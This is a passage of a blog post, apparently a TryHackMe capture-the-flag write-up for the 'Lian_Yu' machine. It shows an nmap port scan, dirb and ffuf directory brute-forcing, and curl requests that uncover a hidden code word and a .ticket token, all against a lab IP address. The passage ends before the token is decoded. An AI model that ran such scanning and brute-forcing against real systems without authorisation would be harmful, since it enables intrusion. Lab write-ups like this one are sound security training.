@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>THM Writeup - Lian_Yu (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Lian_Yu from Try Hack Me." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/lian_yu/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="THM Writeup - Lian_Yu (Easy)">
+<meta property="og:description" content="Writeup of Lian_Yu from Try Hack Me." />
+<meta property="og:url" content="/posts/lian_yu/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-07 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/lian_yu/">THM Writeup - Lian_Yu (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-07</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/thm/">thm</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="/tags/steganography/">Steganography</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Lian_Yu</code> machine is an easy linux box.</p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a scan with <code>nmap</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -p- 10.10.104.254
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-11 11:00 EST
+</span></span><span style="display:flex;"><span>Stats: 0:00:18 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Connect Scan
+</span></span><span style="display:flex;"><span>Connect Scan Timing: About 26.16% <span style="color:#66d9ef">done</span>; ETC: 11:01 <span style="color:#f92672">(</span>0:00:48 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.104.254
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.059s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65530</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp     vsftpd 3.0.2
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">1024</span> 5650bd11efd4ac5632c3ee733ede87f4 <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 396f3a9cb62dad0cd86dbe77130725d6 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a66996d76d6127967ebb9f83601b5212 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 3f437675a85aa6cd33b066420491fea0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp    open  http    Apache httpd
+</span></span><span style="display:flex;"><span>|_http-title: Purgatory
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache
+</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind 2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)</span>
+</span></span><span style="display:flex;"><span>| rpcinfo: 
+</span></span><span style="display:flex;"><span>|   program version    port/proto  service
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp   rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp   rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/tcp6  rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/udp6  rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          38721/udp   status
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          49356/tcp   status
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          54327/udp6  status
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          55707/tcp6  status
+</span></span><span style="display:flex;"><span>49356/tcp open  status  <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100024)</span>
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 70.94 seconds
+</span></span></code></pre></div><h2 id="directory-enumeration">Directory Enumeration<a href="#directory-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a directory enumeration with <code>dirb</code> and <code>ffuf</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ dirb http://10.10.104.254/ /usr/share/wordlists/dirb/big.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>DIRB v2.22    
+</span></span><span style="display:flex;"><span>By The Dark Raver
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>START_TIME: Sun Dec <span style="color:#ae81ff">11</span> 11:06:13 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>URL_BASE: http://10.10.104.254/
+</span></span><span style="display:flex;"><span>WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GENERATED WORDS: <span style="color:#ae81ff">20458</span>                                                         
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---- Scanning URL: http://10.10.104.254/ ----
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.104.254/island/                                                                                                                                                                                               
+</span></span><span style="display:flex;"><span>+ http://10.10.104.254/server-status <span style="color:#f92672">(</span>CODE:403|SIZE:199<span style="color:#f92672">)</span>   
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -t <span style="color:#ae81ff">100</span> -u http://10.10.104.254/island/FUZZ  -w   /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v1.5.0 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://10.10.104.254/island/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># directory-list-2.3-medium.txt [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 61ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                       [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 77ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                       [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 61ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 67ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                       [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 68ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># on atleast 2 different hosts [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 69ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                       [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 69ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 70ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 72ms]</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 73ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 74ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This work is licensed under the Creative Commons  [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 77ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 78ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Copyright 2007 James Fisher [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 79ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2100</span>                    <span style="color:#f92672">[</span>Status: 301, Size: 241, Words: 14, Lines: 8, Duration: 53ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 75ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Caught keyboard interrupt <span style="color:#f92672">(</span>Ctrl-C<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>What is the Web Directory you found? <code>2100</code></p>
+<p>View source-code of this directory <code>/island/</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl 10.10.104.254/island/ 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt; Ohhh Noo, Don&#39;t Talk............... &lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt; I wasn&#39;t Expecting You at this Moment. I will meet you there &lt;/<span style="color:#f92672">p</span>&gt;<span style="color:#75715e">&lt;!-- go!go!go! --&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;You should find a way to &lt;<span style="color:#f92672">b</span>&gt; Lian_Yu&lt;/<span style="color:#f92672">b</span>&gt; as we are planed. The Code Word is: &lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">h2</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color:white&#34;</span>&gt; vigilante&lt;/<span style="color:#f92672">style</span>&gt;&lt;/<span style="color:#f92672">h2</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>I find a Word: <code>vigilante</code></p>
+<p>View source-code of this directory <code>/island/2100</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl http://10.10.104.254/island/2100/
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">align</span><span style="color:#f92672">=</span><span style="color:#e6db74">center</span>&gt;How Oliver Queen finds his way to Lian_Yu?&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">align</span><span style="color:#f92672">=</span><span style="color:#e6db74">center</span> &gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;640&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;480&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.youtube.com/embed/X8ZiFuW41yY&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">iframe</span>&gt; &lt;<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- you can avail your .ticket here but how?   --&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">header</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>I understand that I must find a file with <code>.ticket</code> extension</p>
+<p>I do another directory enumeration with <code>ffuf</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -t <span style="color:#ae81ff">100</span> -u  http://10.10.104.254/island/2100/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt    -e .ticket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v1.5.0 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://10.10.104.254/island/2100/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .ticket 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># on atleast 2 different hosts.ticket [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 64ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#.ticket                [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 64ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># directory-list-2.3-medium.txt [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 64ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Priority ordered case sensative list, where entries were found .ticket [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 65ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                       [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 65ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 66ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 67ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># on atleast 2 different hosts [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 69ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 82ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or send a letter to Creative Commons, 171 Second Street, .ticket [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 82ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ .ticket [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 82ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#.ticket                [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 81ms]</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 81ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Suite 300, San Francisco, California, 94105, USA..ticket [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 84ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 66ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 66ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This work is licensed under the Creative Commons .ticket [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 66ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#.ticket                [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 83ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Copyright 2007 James Fisher.ticket [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 83ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                       [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 84ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                       [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 84ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This work is licensed under the Creative Commons  [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 84ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># directory-list-2.3-medium.txt.ticket [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 58ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                       [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 59ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#.ticket                [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 65ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Copyright 2007 James Fisher [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 67ms]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attribution-Share Alike 3.0 License. To view a copy of this .ticket [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 67ms]</span>
+</span></span><span style="display:flex;"><span>green_arrow.ticket      <span style="color:#f92672">[</span>Status: 200, Size: 71, Words: 10, Lines: 7, Duration: 54ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Caught keyboard interrupt <span style="color:#f92672">(</span>Ctrl-C<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I find new directory: <code>http://10.10.104.254/island/2100/green_arrow.ticket</code>
+What is the file name you found? <code>green_arrow.ticket</code></p>
+<p>I do a http Request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl http://10.10.104.254/island/2100/green_arrow.ticket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This is just a token to get into Queen<span style="color:#960050;background-color:#1e0010">&#39;</span>s Gambit<span style="color:#f92672">(</span>Ship<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RTy8yhBQdscX
+</span></span></code></pre></div><p>After many attempts I find that this <code>RTy8yhBQdscX</code> is <code>base58</code>, I decode it:</p>
